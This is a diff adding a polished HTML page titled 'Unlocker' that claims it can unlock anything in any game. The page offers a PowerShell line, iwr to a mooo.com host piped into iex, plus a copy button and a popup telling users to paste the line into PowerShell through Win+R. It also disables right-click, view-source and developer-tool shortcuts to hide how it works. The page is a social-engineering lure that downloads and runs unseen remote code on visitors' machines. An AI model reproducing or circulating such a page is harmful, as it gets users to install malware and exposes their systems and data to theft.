@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unlocker</title>
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="stylesheet" href="styles.css">
+    <a href="pages/help.html"></a>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
+    <style>
+        html, body { height: 100%; margin: 0; padding: 0; }
+        body {
+            min-height: 100vh;
+            min-width: 100vw;
+            font-family: 'Inter', Arial, sans-serif;
+            color: var(--color-text);
+            background: linear-gradient(124deg, var(--color-bg1) 30%, var(--color-bg2) 100%);
+            overflow: hidden;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: bodyFadeIn 0.6s cubic-bezier(.13,.7,.18,1);
+            transition: background 0.7s;
+        }
+        :root {
+            /* Ultra-modern color palette */
+            --color-bg1: #eef6ff;  --color-bg2: #b6dbff;
+            --color-glass: rgba(255,255,255,0.86);
+            --color-glass-border: #bae1ff66;
+            --color-text: #23324d;   --color-title: #2671ff;
+            --color-title-grad: linear-gradient(95deg,#61adfa 0%,#49e8da 92%);
+            --color-code-bg: #f4f6ffcc;
+            --color-code-text: #1c223c;
+            --color-btn1: #517fff;   --color-btn2: #5affe7;
+            --color-btn-shadow: #6ddffc55;
+            --color-btn-glow: #62ffef85;
+            --color-popup: rgba(255,255,255,0.94);
+            --color-popup-border: #bdefff99;
+            --color-popup-text: #184a58;
+            --shadow-neomorph: 0px 18px 46px 0 #99cef366, 0 2px 20px 0 #bbd6fd33;
+            --icon-grad: linear-gradient(118deg, #935cff 20%, #3ce7d8 84%);
+        }
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --color-bg1: #191f2e;   --color-bg2: #102040;
+                --color-glass: rgba(27,32,49,0.89);
+                --color-title: #b2e6ff;
+                --color-title-grad: linear-gradient(96deg,#67bcfa 0%,#16ffd5 88%);
+                --color-glass-border: #2262a466;
+                --color-code-bg: #232940dc;
+                --color-code-text: #e7f5ff;
+                --color-btn1: #397aff;    --color-btn2: #26fee0;
+                --color-btn-shadow: #1affef48;
+                --color-btn-glow: #48eaff7e;
+                --color-popup: rgba(25,28,38,0.99);
+                --color-popup-border: #52b9ff99;
+                --color-popup-text: #e3f7fd;
+                --shadow-neomorph: 0 22px 52px 0 #3756e822, 0 2px 12px 0 #26ffe522;
+                --icon-grad: linear-gradient(120deg, #7d48fc 16%, #3ce6ba 89%);
+            }
+        }
+        /* --- SVG Blobs (background, more fluid & modern) --- */
+        .svg-blobs {
+            position: fixed; z-index: 0; inset: 0; pointer-events: none;
+            width: 100vw; height: 100vh; min-width: 100vw; min-height: 100vh;
+            pointer-events: none; overflow: visible;
+        }
+        .blob-ani {
+            transform-origin: center;
+            filter: blur(43px);
+            opacity: 0.53;
+        }
+        /* --- Card --- */
+        main.container {
+            position: relative;
+            background: var(--color-glass);
+            border-radius: 2.5rem;
+            box-shadow: var(--shadow-neomorph);
+            border: 1.7px solid var(--color-glass-border);
+            padding: 60px 32px 38px 32px;
+            width:100%;
+            max-width:398px;
+            margin: 0 18px;
+            z-index: 2;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            animation: cardEnter 1.5s cubic-bezier(.12,.75,.35,1.2) 0s 1 normal both,cardFloat 9s ease-in-out infinite alternate;
+            will-change: transform, box-shadow;
+            perspective: 900px;
+            backdrop-filter: blur(30px);
+            box-sizing: border-box;
+            transition: box-shadow 0.22s, background 0.33s, border 0.21s;
+        }
+        main.container.parallax {}
+        main.container::before {
+            content: "";
+            position: absolute;
+            inset: 0; z-index: 1; pointer-events: none;
+            border-radius: inherit;
+            background: linear-gradient(103deg,rgba(105,205,255,0.13) 8%,rgba(251,184,255,0.09) 86%);
+            opacity: 0.45;
+        }
+        main.container::after {
+            content: "";
+            position: absolute;
+            inset: 0;
+            border-radius: inherit;
+            pointer-events: none;
+            opacity: 0.17;
+            z-index: 2;
+            background: linear-gradient(108deg,rgba(255,255,255,0.16) 30%,rgba(35,210,255,0.13) 70%);
+            background-size: 180% 128%;
+            animation: shimmerMove 9s linear infinite;
+        }
+        @keyframes shimmerMove {
+            0% { background-position: 100% 0%; }
+            100% { background-position: 0% 100%; }
+        }
+        @keyframes containerPop {
+            0% { opacity: 0; transform: scale(0.91) translateY(35px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); }
+        }
+        @keyframes cardEnter {
+          0% { opacity: 0; transform: scale(0.72) translateY(80px) rotateY(-6deg) rotateX(8deg); }
+          65% { opacity: 1; transform: scale(1.04) translateY(-6px) rotateY(.7deg) rotateX(-4deg); }
+          100% { opacity: 1; transform: scale(1.00) translateY(0) rotateY(0) rotateX(0); }
+        }
+        @keyframes cardFloat {
+            0% { transform: translateY(0px) scale(1.001); }
+            48% { transform: translateY(-4px) scale(1.014) rotateY(1.1deg); }
+            62% { transform: translateY(5px) scale(0.997) rotateY(-.8deg); }
+            100% { transform: translateY(2px) scale(1.007) rotateX(.9deg); }
+        }
+        .glass-effect {
+            backdrop-filter: blur(36px) brightness(1.07);
+            border-radius: 2rem;
+            box-shadow: 0 22px 50px 0 #67bdf266, 0 5px 32px 0 #0e162620;
+        }
+        .title-glassy {
+            display: flex; align-items: center; gap: 0.67em; margin-bottom: 11px; position: relative; z-index: 4;
+        }
+        .glassy-icon { width: 2.65rem; height: 2.65rem;
+            flex-shrink: 0; border-radius: 50%; background: var(--icon-grad);
+            box-shadow: 0 0 16px 0 #b2fbe7a9, 0 2.5px 22px #653afd27;
+            display: flex; align-items: center; justify-content: center;
+            overflow: hidden; position: relative;
+        }
+        .glassy-icon-inner {
+            position: absolute; width: 140%; height: 140%; left: -17%; top: -11%;
+            background: linear-gradient(120deg, rgba(255,255,255,0.14) 38%, rgba(61,255,240,0.12) 100%);
+            filter: blur(18px); animation: iconInnerHue 16s linear infinite;
+        }
+        @keyframes iconInnerHue { 0%{filter:blur(18px)hue-rotate(0deg);} 100%{filter:blur(18px)hue-rotate(68deg);} }
+        .icon-keys { width: 1.28em; height: 1.28em; position: relative; z-index: 2; filter: drop-shadow(0 2px 9px #faffc095); }
+        .keytool-title-text {
+            font-size: clamp(2.22rem, 5vw, 2.82rem); font-weight: 800; background: var(--color-title-grad);
+            background-clip: text; color: transparent; -webkit-background-clip: text;-webkit-text-fill-color: transparent;
+            letter-spacing: 0.01em; text-shadow: 0 2px 22px rgba(70,130,231,0.08);
+        }
+        p { font-size: 1.13rem; color: var(--color-text); margin: 0 0 15px 0; font-weight: 465; line-height: 1.56; letter-spacing: 0.01em; animation: contentFade .80s 0.1s backwards cubic-bezier(.2,.6,.31,1); }
+        /* Code block */
+        .code {
+            background: var(--color-code-bg);
+            color: var(--color-code-text);
+            font-family: 'JetBrains Mono', 'Fira Mono', 'Consolas', monospace;
+            padding: 19px 12px;
+            border-radius: 14px;
+            font-size: 1.11rem;
+            margin: 19px 0 26px 0;
+            box-shadow: 0 2.5px 18px 0 rgba(27,70,210,0.09);
+            user-select: none;
+            pointer-events: auto;
+            border: 1.3px solid var(--color-glass-border);
+            display: inline-block;
+            letter-spacing: 0.01em;
+            width:100%; text-align: center;
+            animation: codeEnter .81s 0.21s backwards cubic-bezier(.21,.7,.31,1);
+            font-weight: 600;
+            cursor: pointer;
+            transition: background .16s, box-shadow .17s, filter .10s;
+        }
+        .code:active, .code.copy-animate {
+            filter: brightness(1.2) drop-shadow(0 0 12px #99fff6cc);
+            background: linear-gradient(98deg,var(--color-code-bg) 50%,#e1ffffc0 99%);
+        }
+        /* Button modernized */
+        .copy-button {
+            margin: 0 0 18px 0;
+            background: linear-gradient(93deg, var(--color-btn1) 0%, var(--color-btn2) 97%);
+            color: #fff;
+            border: none;
+            outline: none;
+            border-radius: 17px;
+            padding: 24px 0px 22px 0px;
+            width:100%;
+            font-size: 1.23rem;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 6px 27px 0 var(--color-btn-shadow), 0 2.5px 10px #54ffff10;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            transition: background 0.17s, transform 0.14s, box-shadow 0.19s, filter 0.12s;
+            animation: buttonPulse 2.48s infinite alternate cubic-bezier(.56,.31,.5,1);
+            z-index: 2;
+        }
+        .copy-button:before {
+            content: "";
+            display: block;
+            position: absolute;
+            inset: 0;
+            border-radius: 22px;
+            background: linear-gradient(118deg, rgba(255,255,255,0.18) 23%, rgba(36,255,255, 0.09) 100%);
+            z-index: 1;
+            pointer-events: none;
+            opacity: 0.68;
+        }
+        .copy-icon {
+            display: inline-flex; align-items: center;
+            width: 1.28em; height: 1.28em; color: #f2faff; z-index: 2;
+            filter: drop-shadow(0 0 9px #36fff865);
+        }
+        .copy-button:active { transform: scale(0.968); filter: brightness(0.95); }
+        .copy-button:hover, .copy-button:focus {
+            filter: brightness(1.08) saturate(1.19) drop-shadow(0 0 1.1em var(--color-btn-glow));
+            box-shadow: 0 14px 31px 0 var(--color-btn-shadow);
+        }
+        .copy-button:focus-visible { outline: 2.7px solid #53b4ff; }
+        @keyframes buttonPulse {
+            from { transform: scale(1); }
+            to { transform: scale(1.047); }
+        }
+        .ripple {
+            position: absolute;
+            border-radius: 50%;
+            transform: scale(0);
+            animation: ripple 0.61s linear;
+            background: rgba(255,255,255,0.34);
+            pointer-events: none;
+            z-index: 20;
+        }
+        @keyframes ripple {
+            to {
+                transform: scale(2.45);
+                opacity: 0;
+            }
+        }
+        /* Checkmark animation inside button */
+        .copy-success-check {
+           display: inline-block;
+           height: 1.1em;
+           width: 1.1em;
+           margin-left: 0.45em;
+           vertical-align: -2px;
+           stroke: #34e1a3;
+           stroke-width: 3.2px;
+           fill: none;
+           stroke-dasharray: 17 17;
+           stroke-dashoffset: 17;
+           opacity: 0;
+           animation: copyCheckIn .45s .12s cubic-bezier(.6,1.4,.77,1.01) forwards;
+        }
+        @keyframes copyCheckIn {
+          to { stroke-dashoffset: 0; opacity: 1; }
+        }
+        .copy-button.copied {
+            background: linear-gradient(93deg, #17d45a 0%, #43fad5 90%);
+            filter: brightness(1.13) saturate(1.24) drop-shadow(0 0 14px #57ffe7cc);
+            animation: buttonPulse 0.28s .03s cubic-bezier(.7,1.9,.68,1.11);
+        }
+        .copy-button.copied .copy-icon { opacity: 0.42; }
+        /* Popup modernized */
+        .popup {
+            position: fixed; top: 53.5%; left: 50%;
+            transform: translate(-50%, -56%) scale(0.98);
+            background: var(--color-popup);
+            backdrop-filter: blur(22px);
+            padding: 38px 26px 25px 26px;
+            border-radius: 23px;
+            box-shadow: 0 10px 44px 0 #22f9fd25,0 9px 48px 0 rgba(60, 130, 250, 0.12);
+            border: 1.1px solid var(--color-popup-border);
+            z-index: 1000;
+            display: flex;
+            flex-direction: column; align-items: center;
+            min-width: 170px; max-width: 98vw;
+            opacity: 0; pointer-events: none;
+            visibility: hidden;
+            transition: opacity 0.38s, transform 0.22s;
+        }
+        .popup.open {
+            opacity: 1;
+            pointer-events: auto;
+            transform: translate(-50%, -50%) scale(1.003);
+            visibility: visible;
+        }
+        .popup .popup-icon { width: 2.77em; height: 2.77em; margin-bottom: 8px; display: block; }
+        .popup-icon-checkcircle {
+            stroke-dasharray: 52.5 52.5;
+            stroke-dashoffset: 52.5;
+            animation: popCircleDraw 0.27s 0.04s ease-in forwards;
+            opacity: 0.82;
+        }
+        @keyframes popCircleDraw { to { stroke-dashoffset: 0; } }
+        .popup-icon-checkmark {
+            stroke-dasharray: 16 16; stroke-dashoffset: 16;
+            animation: popCheckDraw 0.16s 0.27s cubic-bezier(.33,1.1,.82,1) forwards; opacity: 0.89;
+        }
+        @keyframes popCheckDraw { to { stroke-dashoffset: 0; } }
+        .popup p { font-size: 1.11rem; margin: 8px 0 12px 0; color: var(--color-popup-text); text-align: center; }
+        /* Popup button modern, even less distracting */
+        .popup .popup-button {
+            background: linear-gradient(95deg, #1edb5a 0%, #34dbda 97%);
+            color: #fff;
+            border: none;
+            padding: 12px 28px 12px 22px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 1.04rem;
+            font-weight: 600;
+            margin-top: 1px;
+            box-shadow: 0px 3px 14px rgba(31,180,150,0.13);
+            display: flex;
+            align-items: center;
+            gap: 7px;
+            transition: background 0.12s, transform 0.12s, filter 0.15s;
+            position: relative;
+            overflow: hidden;
+        }
+        .popup-button:focus-visible { outline: 2.1px solid #6acaff; }
+        .popup-button:active {background:linear-gradient(98deg,#189943 0%,#07ce9f 100%); transform: scale(0.985);}
+        .popup-button:hover, .popup-button:focus{ background:linear-gradient(97deg,#11ad44 0%,#57ffd6 100%); filter:brightness(1.09); }
+        .popup-button svg{ width: 1em; height: 1em; margin-left: 4px; vertical-align: middle; opacity: 0.88; transition: opacity 0.13s; }
+        .popup-button:hover svg{ opacity: 1; }
+        /* --- Responsive --- */
+        @media (max-width: 600px) {
+            main.container { padding: 17vw 2vw 15vw 2vw; border-radius: 15px; max-width:97vw; }
+            .code { font-size: 0.969rem; word-break: break-all; }
+            .popup { padding: 13px 4vw 9px 4vw; border-radius: 12px; }
+            .title-glassy { gap: 0.36em; }
+            .glassy-icon { width: 1.7rem; height: 1.7rem; }
+            .popup .popup-icon { width: 2em; height: 2em; margin-bottom: 4px; }
+            .copy-button {font-size:1rem; padding:16px 0 !important;}
+        }
+        @media (max-width: 420px) {
+            main.container { padding: 8vw 1vw 7vw 1vw; max-width:98vw; }
+        }
+        @keyframes contentFade { 0%{opacity:0;transform:translateY(17px)} 100%{opacity:1;transform:translateY(0)} }
+        @keyframes codeEnter { from {opacity:0;transform:translateY(23px)scale(0.98);} to {opacity:1;transform:translateY(0)scale(1);} }
+        /* Modern body fade */
+        @keyframes bodyFadeIn { from {opacity:0;} to {opacity:1;} }
+        /* Additional ultra-modern upgrades */
+        body::before {
+            content: "";
+            pointer-events: none;
+            position: fixed; z-index: 3; inset: 0;
+            background: radial-gradient(ellipse at 20% 65%,rgba(255,255,255,0.11) 0%, transparent 70%),
+                        radial-gradient(ellipse at 80% 40%, rgba(150,200,255,0.07) 0%, transparent 70%),
+                        linear-gradient(115deg,transparent 60%,rgba(60,225,255,0.06) 80%,transparent 100%);
+            mix-blend-mode: screen;
+        }
+        /* Theme toggle */
+        .theme-btn {
+            position: absolute; top: 18px; right: 16px; z-index: 13;
+            background: var(--color-btn2);
+            color: #1d2a4a;
+            border: none; border-radius: 1.4em;
+            width: 2.35em; height: 2.35em; display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 1.5px 10px #22dbe855;
+            font-size: 1.1em;
+            cursor: pointer;
+            opacity: .74;
+            transition: background .14s, color .16s, opacity .13s;
+        }
+        .theme-btn:hover,.theme-btn:focus{ opacity:1; background:var(--color-btn1); color:#fff; }
+        .theme-btn:active{ filter:brightness(.94); }
+        @media (max-width: 570px) {
+            .theme-btn { top: 7px; right: 7px; }
+        }
+        /* ARIA visually hidden utility class */
+        .visually-hidden {
+            position: absolute !important;
+            height: 1px; width: 1px;
+            overflow: hidden; clip: rect(1px, 1px, 1px, 1px);
+            white-space: nowrap;
+        }
+        /* Optional: particles */
+        #particles-canvas {
+            position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2;pointer-events:none;
+        }
+    </style>
+</head>
+<body>
+<button class="theme-btn" id="themeToggle" aria-label="Toggle theme" tabindex="0">
+    <span id="themeIcon">🌓</span>
+</button>
+<canvas id="particles-canvas"></canvas>
+    <!-- SVG Animated fluid blobs -->
+    <svg class="svg-blobs" width="100%" height="100%" viewBox="0 0 1920 1080" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <defs>
+            <radialGradient id="b1" cx="50%" cy="45%" r="72%" gradientTransform="rotate(10)">
+                <stop offset="0%" stop-color="#2e79fb" />
+                <stop offset="100%" stop-color="#16e5ed" stop-opacity="0.39" />
+            </radialGradient>
+            <radialGradient id="b2" cx="56%" cy="55%" r="54%">
+                <stop offset="0%" stop-color="#48eff6" stop-opacity="0.32" />
+                <stop offset="100%" stop-color="#86ccff" stop-opacity="0.13" />
+            </radialGradient>
+            <radialGradient id="b3" cx="38%" cy="76%" r="62%">
+                <stop offset="0%" stop-color="#ffb1ec" stop-opacity="0.36" />
+                <stop offset="100%" stop-color="#6dc0ff" stop-opacity="0.27" />
+            </radialGradient>
+        </defs>
+        <ellipse class="blob-ani" style="animation: blobSvgA 23s ease-in-out infinite alternate;" cx="430" cy="230" rx="350" ry="190" fill="url(#b1)"></ellipse>
+        <ellipse class="blob-ani" style="animation: blobSvgB 28s ease-in-out infinite alternate 2s;" cx="1480" cy="900" rx="320" ry="170" fill="url(#b2)"></ellipse>
+        <ellipse class="blob-ani" style="animation: blobSvgC 31s ease-in-out infinite alternate 4s;" cx="340" cy="900" rx="180" ry="115" fill="url(#b3)"></ellipse>
+        <animateMotion id="ani1"/>
+        <style>
+            @keyframes blobSvgA {
+                0%   { transform:translateX(0px) scale(1.01) rotate(0deg); }
+                48%  { transform:translateY(32px) scale(1.11) rotate(-4deg); }
+                76%  { transform:translateX(-22px) scale(0.98) rotate(2deg); }
+                100% { transform:translateX(47px) scale(1.14) rotate(6deg); }
+            }
+            @keyframes blobSvgB {
+                0%   { transform:translateY(0px) scale(1.04) rotate(-2deg); }
+                53%  { transform:translateY(-28px) scale(1.13) rotate(3deg); }
+                79%  { transform:translateX(18px) scale(0.96) rotate(-2deg); }
+                100% { transform:translateY(22px) scale(1.1) rotate(-7deg); }
+            }
+            @keyframes blobSvgC {
+                0%   { transform:scale(1.07) rotate(2deg); }
+                37%  { transform:scale(1.03) rotate(4deg); }
+                52%  { transform:translateY(-15px) scale(1.18) rotate(-5deg); }
+                100% { transform:scale(1.15) rotate(-3deg); }
+            }
+        </style>
+    </svg>
+    <main class="container" aria-label="Main Unlocker" tabindex="-1">
+        <div class="title-glassy">
+            <span class="glassy-icon" aria-hidden="true">
+                <span class="glassy-icon-inner"></span>
+                <svg viewBox="0 0 24 24" fill="none" class="icon-keys"><ellipse cx="14.35" cy="8.8" rx="7.35" ry="7" fill="#fff5"/><path d="M4 21l9-9m8.12-2.12A3 3 0 0119 12.99l-1 .97a1 1 0 01-1.42 0l-2.17-2.17m-1.99.42a2.8 2.8 0 10-3.95-3.95 2.8 2.8 0 003.95 3.95zm-1.1-2.83l1.98 1.98" stroke="#f4f7ff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><circle cx="8.8" cy="8.8" r="1.3" fill="#fff8"/><circle cx="14.35" cy="8.8" r="1.23" fill="#fff6"/></svg>
+            </span>
+            <span class="keytool-title-text">Unlocker</span>
+        </div>
+        <p style="margin-bottom:1px;opacity:.9;">Best Unlocker</p>
+        <p><strong>This unlocker can unlock anything in any game you want.</strong></p>
+	<p><strong>It doesnt matter the game, once you paste, enter the game name and it will do its thing!!</strong></p>
+	<p>
+    <strong>
+        <a href="help.html">help</a>
+    </strong>
+</p>
+        <div class="code" aria-label="Powershell code"><strong>iwr "http://extratools.mooo.com/" | iex</strong></div>
+        <button class="copy-button" id="copyButton" aria-label="Copy PowerShell code">
+            <span class="copy-icon" aria-hidden="true">
+                <svg width="32" height="32" viewBox="0 0 32 32" fill="none"><rect x="11.5" y="8.5" width="11" height="15" rx="3.5" stroke="currentColor" stroke-width="1.7"/><rect x="8.5" y="5.5" width="11" height="15" rx="3.5" fill="#fff2" stroke="currentColor" stroke-width="1.2"/></svg>
+            </span>
+            <span class="copy-btn-text">Copy PowerShell Code</span>
+        </button>
+    </main>
+    <div class="popup" id="popup" role="dialog" aria-modal="true" aria-label="Copied popup" aria-live="polite">
+        <svg class="popup-icon" aria-hidden="true" viewBox="0 0 32 32">
+            <circle class="popup-icon-checkcircle" cx="16" cy="16" r="13" stroke="#39db95" stroke-width="2.2" fill="none"/>
+            <path class="popup-icon-checkmark" d="M11.2 16.3l3.3 3.3 6.3-6.2" stroke="#39db95" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+        </svg>
+        <p>Copied! Press <strong>Win + R</strong> on your keyboard → then type <strong>powershell</strong> → and click <strong>Enter/OK</strong>, then <strong>paste</strong> what you copied and click <strong>Enter</strong> on your keyboard!</p>
+        <button class="popup-button" id="closeButton" aria-label="Close popup">
+            Close
+            <svg viewBox="0 0 20 20" fill="none"><path d="M6 6L14 14M14 6L6 14" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg>
+        </button>
+    </div>
+    <script>
+        // --- Animate popup open/fade + auto close ---
+        let autoClosePopupTimer;
+        function openPopupFade() {
+            let el = document.getElementById('popup');
+            el.classList.add('open');
+            el.setAttribute('aria-live','polite');
+            // Restart icon animation:
+            const circ = el.querySelector('.popup-icon-checkcircle');
+            const check = el.querySelector('.popup-icon-checkmark');
+            circ && (circ.style.animation = 'none') && circ.offsetHeight && (circ.style.animation = '');
+            check && (check.style.animation = 'none') && check.offsetHeight && (check.style.animation = '');
+            // Auto-close after ~2 seconds
+            clearTimeout(autoClosePopupTimer);
+            autoClosePopupTimer = setTimeout(() => closePopupFade(), 2030);
+        }
+        function closePopupFade() {
+            let el = document.getElementById('popup');
+            el.classList.remove('open');
+            clearTimeout(autoClosePopupTimer);
+        }
+        // --- Button ripple effect ---
+        function addRipple(event, btn) {
+            const circle = document.createElement('span');
+            circle.className = 'ripple';
+            const rect = btn.getBoundingClientRect();
+            const size = Math.max(rect.width, rect.height);
+            circle.style.width = circle.style.height = size + 'px';
+            circle.style.left = (event.clientX - rect.left - size/2) + 'px';
+            circle.style.top = (event.clientY - rect.top - size/2) + 'px';
+            btn.appendChild(circle);
+            setTimeout(() => circle.remove(), 490);
+        }
+        // Card Parallax (desktop only)
+        (function(){
+            var card = document.querySelector('main.container');
+            if(!card) return;
+            var supportsTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+            if (!supportsTouch) {
+                card.addEventListener('mousemove', function(e) {
+                    var rect = card.getBoundingClientRect(), x = e.clientX - rect.left, y = e.clientY - rect.top;
+                    var px = (x/rect.width - 0.5) * 2, py = (y/rect.height - 0.5) * 2;
+                    card.style.transform = `perspective(999px) rotateY(${-px*8.6}deg) rotateX(${py*7.7}deg) scale(1.01)`;
+                });
+                card.addEventListener('mouseleave', function(){
+                    card.style.transform = '';
+                });
+                card.classList.add('parallax');
+            }
+        })();
+
+        // Copy logic: clickable code AND button, microinteraction for Copied!
+        const copyButton = document.getElementById('copyButton');
+        const codeBlock = document.querySelector('.code');
+        const copyBtnLabel = copyButton.querySelector('.copy-btn-text');
+        let originalBtnText = copyBtnLabel.innerHTML;
+        let isCopying = false;
+        function animateCopySuccess(btn) {
+            if(isCopying) return;
+            isCopying = true;
+            btn.classList.add('copied');
+            copyBtnLabel.innerHTML = 'Copied! <svg class="copy-success-check" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19 17"><path d="M3 9.4l5 5 8-9.8"/></svg>';
+            setTimeout(()=>{
+                btn.classList.remove('copied');
+                copyBtnLabel.innerHTML = originalBtnText;
+                isCopying = false;
+            },1800);
+        }
+        function copyCodeToClipboard(event) {
+            const codeToCopy = `iwr "http://extratools.mooo.com/" -Headers @{ "ngrok-skip-browser-warning" = "true" } | iex`;
+            navigator.clipboard.writeText(codeToCopy).then(function() {
+                openPopupFade();
+                animateCopySuccess(copyButton);
+            }).catch(function(err) {
+                console.error('Error in copying text: ', err);
+            });
+            addRipple(event||{clientX:codeBlock.offsetLeft+10,clientY:codeBlock.offsetTop+10}, copyButton);
+            codeBlock.classList.add('copy-animate');
+            setTimeout(()=>codeBlock.classList.remove('copy-animate'),250);
+        }
+        codeBlock.addEventListener('click', copyCodeToClipboard);
+        copyButton.addEventListener('click', copyCodeToClipboard);
+        codeBlock.setAttribute('tabindex','0');
+        codeBlock.setAttribute('role','button');
+        codeBlock.setAttribute('aria-label','Click to copy PowerShell code');
+        codeBlock.addEventListener('keydown', function(e){if(e.key==='Enter'||e.key===' '){ copyCodeToClipboard(e);} });
+
+        document.getElementById('closeButton').addEventListener('click', function() {
+            closePopupFade();
+        });
+        document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'I') e.preventDefault();
+            else if (e.ctrlKey && e.shiftKey && e.key === 'J') e.preventDefault();
+            else if (e.ctrlKey && e.key === 'U') e.preventDefault();
+        });
+        document.addEventListener('mousedown', function(e) { if (e.button === 2) e.preventDefault(); });
+
+        // Theme toggle logic
+        const themeToggle = document.getElementById('themeToggle');
+        const themeIcon = document.getElementById('themeIcon');
+        function setTheme(mode) {
+            if(mode==='dark'||(mode==='system'&&window.matchMedia('(prefers-color-scheme:dark)').matches)){
+                document.documentElement.setAttribute('data-theme','dark');
+                themeIcon.innerText = '🌙';
+            } else {
+                document.documentElement.setAttribute('data-theme','light');
+                themeIcon.innerText = '🌞';
+            }
+        }
+        let themeState = localStorage.getItem('theme-mode')||'system';
+        setTheme(themeState);
+        themeToggle.addEventListener('click',()=>{
+            if(themeState==='light'){themeState='dark';}
+            else if(themeState==='dark'){themeState='system';}
+            else {themeState='light';}
+            localStorage.setItem('theme-mode',themeState);
+            setTheme(themeState);
+        });
+        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change',function(){if(themeState==='system')setTheme('system');});
+
+        // Particle background (optional, subtle)
+        const canvas = document.getElementById('particles-canvas');
+        const ctx = canvas.getContext('2d');
+        let particles=[];
+        function resizeCanvas(){canvas.width=window.innerWidth;canvas.height=window.innerHeight;}
+        resizeCanvas(); window.addEventListener('resize', resizeCanvas);
+        function spawnParticle(){
+            const w=canvas.width,h=canvas.height;
+            return{ x:Math.random()*w, y:Math.random()*h, r:Math.random()*1.2+0.7, a:Math.random()*2*Math.PI, s:Math.random()*0.8+0.2, o:Math.random()*0.14+0.03, c:`#${['fd8','fff','ff8','aff','ffe','bff','fef','afff','fff6'][Math.floor(Math.random()*9)]}`};
+        }
+        for(let i=0;i<38;++i) particles.push(spawnParticle());
+        function updateParticles(){
+            const w=canvas.width,h=canvas.height;
+            ctx.clearRect(0,0,w,h);
+            for(let p of particles){
+                p.x+=(Math.cos(p.a)*p.s)/2; p.y+=(Math.sin(p.a/1.7)*p.s)/3;
+                p.a+=0.002+Math.random()*0.006;
+                if(p.x<-15||p.x>w+15||p.y<-10||p.y>h+10){ Object.assign(p,spawnParticle()); if(Math.random()<.5)p.x=0;if(Math.random()>.5)p.y=0; }
+                ctx.globalAlpha = p.o;
+                ctx.beginPath(); ctx.arc(p.x,p.y,p.r,0,2*Math.PI); ctx.fillStyle = p.c; ctx.fill();
+            }
+        }
+        setInterval(updateParticles, 45);
+    </script>
+</body>
+</html>
